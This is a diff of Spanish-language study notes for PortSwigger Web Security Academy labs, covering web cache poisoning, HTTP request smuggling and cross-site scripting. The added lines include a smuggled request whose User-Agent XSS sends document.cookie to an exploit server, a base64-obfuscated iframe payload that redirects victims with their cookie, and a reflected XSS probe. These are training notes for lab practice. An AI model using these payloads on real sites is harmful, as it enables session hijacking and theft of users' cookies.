@@ -2019,7 +2019,7 @@ Resumen:
 - Unkeyed header
 
 GET /?cb=1234\
-Cabecera `X-Forwarded-Host` con host example.com o google.com\
+Cabecera `X-Forwarded-Host` o `X-Forwarded-For` con host example.com o google.com\
 Send\
 Se refleja respuesta en /resources/js/tracking.js?\
 Mirar si `X-Cache: hit` está\
@@ -2051,12 +2051,11 @@ cambiar el username a carlos y darle a send.\
 Burp Scanner o extensión Smuggler para encontrar el HTTP Smuggling.\
 Quitar las cabeceras useless como "Sec".\
 Añadir al final de la request generada por Burp (cambiando deatos de URLs y demás):\
+Esta rqeuest es la smuggleada que se mete en la request de visitar un post (POST /?uesnuevecá=<id>)
 ```
 GET /post?postId=4 HTTP/1.1
-Host: <change>.web-security-academy.net
-User-agent: "><script>alert(document.cookie);var x=new XMLHttpRequest();
-x.open("GET","https://exploit-<change>.web-security-
-academy.net/"+document.cookie);x.send();</script>
+Host: <cambiar>.web-security-academy.net
+User-agent: "><script>alert(document.cookie);var x=new XMLHttpRequest();x.open("GET","https://exploit-<cambio>.web-security-academy.net/"+document.cookie);x.send();</script>
 ```
 Enviar eso al Intruder y meterle 100 null payloads.\
 
@@ -2068,6 +2067,10 @@ En la barra de búsqueda, checkear TODOS los tags y atributos con el Intruder:\
 **Payload that was sent to victim**\
 ```
 <iframe src="https://acac1f2c1e7f6507c0a71e0c00b100d9.web-security-academy.net/?query=%27%3Cbody%20onhashchange=%22eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXhwbG9pdC1hYzQ0MWY0MDFlZjg2NTkxYzA4ZDFlZGMwMWNlMDBiYy53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQvP2M9Jytkb2N1bWVudC5jb29raWU'))%22%3E//"onload="this.onload='';this.src+='#XSS'"></iframe>
+```
+Si en vez de ?query está el ?searchterm pues también se usa este payload de arriba
+```
+?searchterm="><script>alert%281%29<%2Fscript>
 ```
 
 - DOM XSS
